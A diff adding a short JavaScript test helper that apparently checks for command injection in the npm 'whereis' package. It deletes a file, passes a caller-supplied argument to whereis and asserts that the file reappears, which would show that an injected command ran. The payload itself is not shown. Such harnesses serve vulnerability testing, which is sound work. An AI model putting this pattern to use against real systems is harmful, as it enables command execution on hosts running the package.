@@ -1,0 +1,25 @@
+function exploitFunction(filename) {
+  const whereis = require("whereis");
+  const fs = require("fs");
+
+  try {
+    if (fs.existsSync(filename)) {
+      fs.unlinkSync(filename);
+    }
+  } catch (err) {
+    console.error(err);
+  }
+
+  file_exist = fs.existsSync(filename);
+  expect(file_exist).toBe(false);
+
+  whereis(filename, () => {
+    file_exist = fs.existsSync(filename);
+    expect(file_exist).toBe(true);
+    fs.unlink(filename, function (err) {
+      if (err) throw err;
+    });
+  });
+}
+
+module.exports = { exploitFunction };
